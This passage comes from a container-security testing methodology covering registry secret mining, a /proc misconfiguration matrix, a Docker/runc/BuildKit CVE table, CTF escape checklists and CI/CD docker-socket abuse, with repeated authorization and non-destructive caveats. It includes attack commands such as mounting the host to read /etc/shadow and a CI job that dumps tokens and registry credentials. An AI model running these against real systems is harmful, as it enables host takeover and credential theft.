```bash
curl -sk $REG/v2/backend/api/blobs/sha256:a1b2... | jq '.config.Env, .history[].created_by'
# -> ["PATH=/usr/local/bin:...","DATABASE_URL=postgres://app:S3cr3t@db/prod","AWS_ACCESS_KEY_ID=AKIA..."]
#    ["/bin/sh -c #(nop) ENV DATABASE_URL=...", "RUN pip install -r req.txt", ...]
#    ENV secrets and the exact RUN lines, no layer download needed.
```

Then mine layers for the classic **deleted-secret-in-an-earlier-layer** (phase 6): download each blob into its **own** directory (layers are untrusted archives — `tar -tf` before extracting, a hostile layer can carry `../` traversal), and let `dive` or `diff` across per-layer dirs surface a file added in layer 3 and `rm`'d in layer 5 (the overlay merge hides it; the layer history does not). Two recurring root causes to name in the report: a **`.dockerignore` miss** — `.git/`, `.env`, `id_rsa`, `*.pem`, `.aws/` copied in by a broad `COPY . /app` because they were never ignored (confirm by listing the layer: `tar -tf layer.tar | grep -E '\.env|\.git/|_rsa|\.pem'`) — and a **build-time secret baked by `ARG`/`ENV`** that a later `rm` cannot erase from history. `Whaler` or `dive docker-archive://` reconstructs the Dockerfile; `trivy image <ref>` turns the same pull into a package-CVE list for the severity section.

### 13. Misconfig-detection matrix — read it from inside before you escape

Phase 4 lists capability escapes; this is the enumeration that tells you *which* escape is live, run from inside the container with no tooling but `cat` and `capsh`. Each row is a one-liner, its secure value, and the flag that produced the insecure one. Run them all first — the cheapest escape is the one the box already handed you.

```bash
# Capabilities — the effective set, decoded
grep CapEff /proc/self/status                 # -> CapEff: 00000000a80425fb  (default runtime set)
capsh --decode=$(awk '/CapEff/{print $2}' /proc/self/status)
# default ~14 caps.  CapEff: 000001ffffffffff (or 0000003fffffffff) = FULL caps = --privileged or --cap-add=ALL
# single dangerous bits to grep the decode for: cap_sys_admin, cap_sys_module, cap_sys_ptrace, cap_dac_read_search
```

| What | Read it | Secure value | Insecure value → run flag that caused it |
|---|---|---|---|
| Privileged / full caps | `grep CapEff /proc/self/status` | `...a80425fb` (default) | `...3fffffffff`/`1fffffffff` → `--privileged` or `--cap-add=ALL` (→ 4.2, 4.3 cgroup escape) |
| Seccomp filter | `grep Seccomp /proc/self/status` | `Seccomp: 2` (filter active) | `Seccomp: 0` → `--security-opt seccomp=unconfined` (unblocks `ptrace`, `mount`, `keyctl`, `bpf`) |
| AppArmor | `cat /proc/self/attr/current` | `docker-default (enforce)` | `unconfined` → `--security-opt apparmor=unconfined` |
| User-namespace remap | `cat /proc/self/uid_map` | `0 100000 65536` (remapped) | `0 0 4294967295` → no `userns-remap`; container root == host root on binds |
| No-new-privileges | `grep NoNewPrivs /proc/self/status` | `NoNewPrivs: 1` | `0` → SUID write-back (4.4) and setuid escalations stay live |
| Host PID namespace | `ps aux` (count PIDs); `ls -d /proc/[0-9]*` | only container procs | host procs visible → `--pid=host` (→ 4.8 `/proc/<pid>/cwd` loot) |
| Host devices | `ls -l /dev/sd* /dev/nvme* 2>/dev/null` | none | block devices present → `--privileged`/`--device` (→ 4.2 `mount /dev/sda2`) |

The decisive pairing: **`Seccomp: 0` + `CAP_SYS_ADMIN`** is the `cgroup-v1 release_agent` escape (4.3) without a kernel bug — seccomp-off re-enables `mount(2)`, the capability authorizes the cgroup mount, and the rest is 4.3. **`uid_map` = `0 0 4294967295`** is the quiet killer: every "I mounted host `/`" chain in phase 2/4 only yields *host root* when this holds; with a remap, your in-container root writes files owned by uid 100000 on the host, which downgrades the finding (see 15). `amicontained` prints most of this table in one invocation (`amicontained` → container runtime, caps, seccomp mode, and which namespaces are shared) — but the raw `/proc` reads above work on the stripped boxes where you cannot drop a binary.

Code pair — the run invocation behind the two columns:

```bash
# VULNERABLE                                           # HARDENED
docker run --privileged \                              docker run \
  --security-opt seccomp=unconfined \                    --cap-drop=ALL \
  --security-opt apparmor=unconfined \                    --security-opt no-new-privileges \
  --pid=host -v /:/host ...                               --read-only --userns-remap=default ...
#                                                        # dockerd started with  "userns-remap": "default"  in /etc/docker/daemon.json
```

### 14. CVE lineage — report-classes you evidence by version, not fire on prod

Container escapes are destructive and host-wide by nature; in a bounty program you almost never *fire* them on production. The professional move is to **fingerprint the version** (section 11 Step 1 gives `dockerd`; `runc --version`, `containerd --version`, `buildkitd --version` give the rest) and report the exposure as a version-matched finding with a lab-reproduced PoC, citing the advisory. Fire only on explicitly-authorized, isolated targets or CTF. The lineage, verified:

| Component | CVE | Class / attacker view | Fixed |
|---|---|---|---|
| runc ≤ 1.0-rc6 (Docker < 18.09.2) | CVE-2019-5736 | Overwrite host `runc` via `/proc/self/exe` on the next `docker exec`; root on host. The archetype — still the thing every escape CVE is measured against | 1.0-rc7 / 18.09.2 |
| runc ≤ 1.1.11 | CVE-2024-21626 | "Leaky Vessels": leaked fd lets `WORKDIR`/`cwd` resolve onto the host FS; `docker build` or `runc run` escape (see 4.7) | 1.1.12 |
| BuildKit ≤ 0.12.4 | CVE-2024-23651 | TOCTOU race on a `--mount=type=cache` during build reaches host files (build-time) | 0.12.5 |
| BuildKit ≤ 0.12.4 | CVE-2024-23652 | Arbitrary host file **deletion** via build temp-dir path handling (`docker build` only) | 0.12.5 |
| BuildKit ≤ 0.12.4 | CVE-2024-23653 | Missing privilege check in a GRPC endpoint → a malicious Dockerfile/frontend escapes to the host at build time (the clearest build escape of the four) | 0.12.5 |
| Docker Engine (many branches ≤ v27.1.0) | CVE-2024-41110 | AuthZ-plugin **bypass**: an API request with `Content-Length: 0` reaches the daemon with no body, so the plugin approves what it cannot evaluate — privilege escalation on any daemon fronted by an AuthZ plugin. A 2019 fix that regressed in v19.03 | v23.0.14 / v27.1.1 |
| Docker Desktop 4.25–< 4.44.3 | CVE-2025-9074 | Unauthenticated internal Engine API at `192.168.65.x:2375` reachable from any container; two POSTs mount the host (see 2.4) | 4.44.3 |
| runc < 1.2.8 / < 1.3.3 / ≤ 1.4.0-rc.3 | CVE-2025-31133 | "Leaky Vessels 2": the `/dev/null` masked-path bind is swappable for a symlink via a mount race → write host paths (e.g. `/proc/sys/kernel/core_pattern`) | 1.2.8 / 1.3.3 / 1.4.0-rc.3 |
| runc (same ranges) | CVE-2025-52565 | Race/symlink on the `/dev/console` bind mount targets an unintended host path before protections apply | 1.2.8 / 1.3.3 / 1.4.0-rc.3 |
| runc (same ranges) | CVE-2025-52881 | procfs **write redirection**: runc's writes to `/proc` files are redirected to attacker paths, and it bypasses LSM (SELinux/AppArmor) labels — chains with the other two for host admin | 1.2.8 / 1.3.3 / 1.4.0-rc.3 |
| Linux kernel / runtimes | CVE-2022-0492 | cgroup-v1 `release_agent` writable without `CAP_SYS_ADMIN` on an unprivileged mount → root on host (see 4.3; gate on behavior, not kernel version) | kernel `24f600856418` + distro backports |

Notes an agent needs: the **2025 runc trio is chainable** — the three fixed releases are a single coordinated patch; a host on any runc below the floors above is reportable as all three. **CVE-2024-41110 is a daemon finding, not a container one** — its tell is the AuthZ-plugin behavior noted in section 11 (a `create` with a dangerous body gets 403, but the same request with `Content-Length: 0` slips through). The **BuildKit three fire at build time**, so they are reachable wherever you can influence a `docker build` (Portainer build page 2.5, CI 2.5, a registry you can push a base image to 5.2) — a malicious *base image or frontend* is enough for CVE-2024-23653. Treat every "RCE in FastAPI/Docker core" blog claim the way the fastapi guide does: demand an advisory link before believing an extraordinary core-RCE.

### 15. Severity and the rootless/userns downgrade (make the argument explicit)

The difference between a Critical and a Medium on the same chain is usually one `/proc` read from section 13. Decide severity from what the boundary *actually* yielded, and write the reasoning into the report so the triager cannot discount it:

| Outcome you proved | Typical severity | The sentence that justifies it |
|---|---|---|
| Unauth TCP 2375 / socket → privileged container → host root | Critical | full host compromise, no credentials, from the network / a foothold |
| runc/BuildKit/kernel escape, version-matched + lab PoC | Critical (High if build-time only / preconditions) | version is vulnerable; PoC reproduced out-of-band to avoid prod impact |
| Socket/group win on a **rootless** daemon | Medium–High (not Critical) | privileges of the *service user*, not root; `mount`-the-host chains degrade |
| Socket win but **userns-remap** active | downgrade one step | in-container root maps to a non-0 host uid; host-root writes are not demonstrable |
| Registry write access to an image a deployment pulls | High–Critical | code execution in the deployment, on its pull schedule (5.2) |
| Registry read: config-blob/layer secrets (tokens, keys) | High if live creds, else Medium | the specific secret class and where it still authenticates |
| Registry read: catalog/tags only, no secrets | Low–Info | inventory disclosure; name the internal repos leaked |
| Host-header/metadata SSRF from a container to `169.254.169.254` | High | cloud-credential theft without touching the instance (2.8) |

The two downgrades carry real money, so prove them honestly: **rootless** is `SecurityOptions` containing `name=rootless` (section 11 Step 2) or a socket under `/run/user/<uid>/` (phase 8); **userns-remap** is `uid_map` = `0 0 4294967295` being *false* (section 13). If you cannot show in-container uid 0 writing a host-root-owned file, do not claim host root — claim what you proved (that service user's access) and name the remap as the control that held. That honesty is what a residual-risk statement is made of, and it survives triage where an over-claim gets closed as Informative.

### 16. CTF notes — docker-escape boxes are a genre

Escape boxes (HTB, THM, and the "you have a shell in a container, get host root" pattern) run a near-fixed decision tree. The checklist, in the order that solves the most boxes fastest:

1. **Am I even in a container?** `ls /.dockerenv`, `cat /proc/1/cgroup` (docker/containerd lines), a 12-hex hostname (phase 1). On CTF this is usually a given, but it tells you which tree you are on.
2. **Is the daemon reachable?** `ls -l /var/run/docker.sock`, `env | grep -i docker`, `id` for the `docker`/`lxd` groups, `curl --unix-socket` the socket (section 11). A reachable socket *is* the box — go to the section 11 chain and you are done.
3. **What did they leave unlocked?** Run the entire section 13 matrix. CTF authors escalate privilege by *turning a control off*: `--privileged`, `seccomp=unconfined`, `--pid=host`, `--cap-add=SYS_ADMIN`, a `-v /:/host` bind in the compose file. The box is the one control they flipped.
4. **Capabilities path (4.3).** `CAP_SYS_MODULE` → LKM reverse shell; `CAP_DAC_READ_SEARCH` → shocker/`open_by_handle_at` to `/root/root.txt`; `CAP_SYS_ADMIN`(+seccomp off) → cgroup `release_agent`; `CAP_SYS_PTRACE`(+`--pid=host`) → inject a host root process.
5. **Mounts and devices (4.2/4.4).** `mount`/`findmnt`/`lsblk` — a host path bound in, or `/dev/sda*` visible, means `mount` the disk and read the flag.
6. **Shared PID namespace (4.8).** `ls -l /proc/*/cwd` for a cwd that resolves to a host path — read keys/flags straight through the magic symlink, no escape needed.
7. **Version-gated CVE as the intended path (4.5–4.7, section 14).** `docker --version`, `runc --version` — if they pinned an old runc, the box wants CVE-2019-5736 or CVE-2024-21626.

**What differs from a bounty program.** In CTF: single-tenant, destructive moves are free, overwriting host `runc` (CVE-2019-5736) or planting an SUID bash is expected, the flag at `/root/root.txt` *is* the proof, and you fire escapes on the live target. In a bounty: the host is shared and production, you **do not** fire runc/kernel escapes on prod (section 14 — version-match and lab-repro instead), the proof is a minimal redacted artifact plus cleanup (section 11 Step 6), rootless/userns downgrades the whole finding (section 15), and a `release_agent` or `/proc/self/exe` overwrite that would be a one-line writeup is, un-authorized, a destructive act you must not perform. The CTF checklist is the fastest *enumeration* in either world; only the trigger-the-escape step changes.

### 17. CI/CD docker-socket abuse — the pipeline is a daemon client

Phase 2.5 flags Portainer and GitLab runners as daemon proxies; this is the CI class in its own right, because it is where the socket is most often exposed *by design* and least often reviewed. The pattern is universal across runners (GitLab, Jenkins, GitHub Actions self-hosted, Drone, Woodpecker): to let pipelines "build and push images," the operator binds the host `/var/run/docker.sock` into the job container or sets `DOCKER_HOST` at it. Any attacker who can influence a pipeline — a PR from a fork, a writable `.gitlab-ci.yml`/`Jenkinsfile`, a compromised dependency that runs at build — then has the full section 11 chain, as root, on the runner host.

```bash
# First thing in any job you can run — is the socket here?
ls -l /var/run/docker.sock 2>/dev/null; echo "DOCKER_HOST=$DOCKER_HOST"
docker version 2>/dev/null | sed -n '1,8p'    # or: docker info | grep -i rootless
# -> a Server block = the job can drive the host daemon. "Cannot connect" = socket not mounted (good).
```

The three concrete abuse shapes, loudest to quietest:

- **Mount the host from a job step.** A single pipeline line is section 11: `docker run --rm -v /:/host alpine cat /host/etc/shadow` — or, for persistence the next legitimate job inherits, drop an SSH key / SUID bash onto the runner host. On shared runners this is cross-tenant: other projects' build secrets, caches, and source trees are on that host.
- **Dump the environment, don't shell.** Runner job containers are throwaway, but their *environment* holds the keys — registry creds (`CI_REGISTRY_PASSWORD`, `DOCKER_AUTH_CONFIG`), cloud tokens, deploy SSH keys, and signing material injected as CI variables. One benign-looking step exfiltrates them without ever touching the socket:

```yaml
# .gitlab-ci.yml (or equivalent) — an attacker-controlled step
leak:
  image: alpine
  script:
    - env | sort                      # CI_JOB_TOKEN, AWS_*, REGISTRY_*, KUBECONFIG contents
    - cat /kaniko/.docker/config.json 2>/dev/null   # pushed registry auth, base64 user:pass
    - cat $CI_PROJECT_DIR/.git-credentials 2>/dev/null
```

  On an authorized engagement, capture the *shape* (variable names present, which are secret-masked) rather than exfiltrating live values — the presence of `AWS_SECRET_ACCESS_KEY` in a fork-PR-triggered job is the finding; you do not need to spend the key to prove it.
- **Poison a shared build cache or base image.** Where the runner reuses images (`pull_policy: if-not-present`) or a buildkit cache mount, a job that writes a backdoored layer into a tag/cache others consume is the registry-poisoning chain (5.2) one step upstream — and if the runner's BuildKit is ≤ 0.12.4, a crafted Dockerfile is build-time escape (CVE-2024-23653, section 14) with no socket mount needed at all.

The decision points that set severity: **does the pipeline run attacker-influenced code before the socket is used?** (fork PRs that trigger builds, or `script:` steps an external contributor can edit, are the high-severity entry); **is the runner shared across projects/tenants?** (turns host-root into cross-tenant compromise); **rootless runner?** (section 15 downgrade applies — many managed runners now run rootless or with a sysbox/kata runtime specifically to neuter this). `pspy` on a runner host catches the root-run `docker build`/`create` whose arguments come from pipeline input — the injection site named in phase 7. Report it as "pipeline X grants host-root (or cross-tenant) via the mounted Docker socket," with the one offending line and the `uid=0` proof, and recommend the standard fixes: rootless/sysbox runtime, socket-less building (kaniko/buildah/`buildctl` against a remote BuildKit), or an ephemeral per-job VM.

### References (v1.1 supplement)

- NVD, CVE-2024-21626 (runc leaked-fd / WORKDIR escape) — https://nvd.nist.gov/vuln/detail/CVE-2024-21626
- Palo Alto Unit42, "Leaky Vessels" container-escape set (runc + BuildKit) — https://www.paloaltonetworks.com/blog/prisma-cloud/leaky-vessels-vulnerabilities-container-escape/
- Snyk, CVE-2024-23651 (BuildKit mount-cache race) — https://snyk.io/blog/cve-2024-23651-docker-buildkit-mount-cache-race
- Snyk, CVE-2024-23653 (BuildKit GRPC SecurityMode build-time breakout) — https://snyk.io/blog/cve-2024-23653-buildkit-grpc-securitymode-privilege-check
- Docker, security advisory — Docker Engine AuthZ plugin bypass (CVE-2024-41110) — https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/
- NVD, CVE-2024-41110 — https://nvd.nist.gov/vuln/detail/CVE-2024-41110
- GHSA-9493-h29p-rfm2 / NVD, CVE-2025-31133 (runc masked-path mount race) — https://nvd.nist.gov/vuln/detail/CVE-2025-31133
- GitLab advisory DB, runc CVE-2025-52565 (/dev/console bind race) — https://advisories.gitlab.com/pkg/golang/github.com/opencontainers/runc/CVE-2025-52565/
- GitLab advisory DB, runc CVE-2025-52881 (procfs write redirection / LSM bypass) — https://advisories.gitlab.com/golang/github.com/opencontainers/runc/CVE-2025-52881/
- Sysdig, 2025 runc container-escape trio analysis (fixed 1.2.8 / 1.3.3 / 1.4.0-rc.3) — https://sysdig.com/blog/runc-container-escape-vulnerabilities/
- Ubuntu CVE tracker, CVE-2022-0492 (cgroup-v1 release_agent) — https://ubuntu.com/security/CVE-2022-0492
- Docker Engine API reference (version/info/containers endpoints) — https://docs.docker.com/reference/api/engine/
- OCI distribution-spec (v2 API: catalog pagination, manifests, blobs by digest) — https://github.com/opencontainers/distribution-spec/blob/main/spec.md
- Docker image manifest v2 schema 2 (config blob media type, layer digests) — https://distribution.github.io/distribution/spec/manifest-v2-2/

*Provenance: v1.1 supplement drafted 2026-11-19 by claude-opus-4-8, appending sections 11–17 (expected-output socket and registry walks, misconfig-detection matrix, verified CVE-lineage table, severity/rootless-estimation guidance, CTF escape-box notes, and CI/CD docker-socket abuse) to the corpus-mined v1.0 methodology. CVE rows re-verified against NVD, GitHub Security Advisories, and vendor advisories (Docker, Snyk, Palo Alto Unit42, Sysdig, Ubuntu CVE tracker); API and registry response shapes verified against the Docker Engine API and OCI distribution-spec references listed above. Existing v1.0 content preserved byte-intact; only new sections and the frontmatter version/provenance were added.*
